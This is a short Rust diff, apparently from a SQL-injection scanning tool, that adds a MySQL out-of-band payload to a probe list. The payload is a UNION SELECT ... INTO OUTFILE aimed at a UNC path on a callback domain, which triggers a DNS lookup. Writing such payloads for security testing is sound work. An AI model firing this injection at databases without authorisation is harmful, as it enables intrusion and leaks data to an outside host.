@@ -325,6 +325,16 @@ fn mysql_oob(fqdn: &str, token: &str) -> Vec<OobPayload> {
             token,
             fqdn,
         ),
+        // PortSwigger second UNC primitive: SELECT ... INTO OUTFILE on a
+        // UNC path (Windows-only, same FILE-privilege requirement).
+        // Appended last so existing probe order is unchanged.
+        OobPayload::new(
+            format!("' UNION SELECT 'injekt' INTO OUTFILE '\\\\\\\\{fqdn}\\\\a' -- -"),
+            "mysql",
+            OobChannel::Dns,
+            token,
+            fqdn,
+        ),
     ]
 }
 
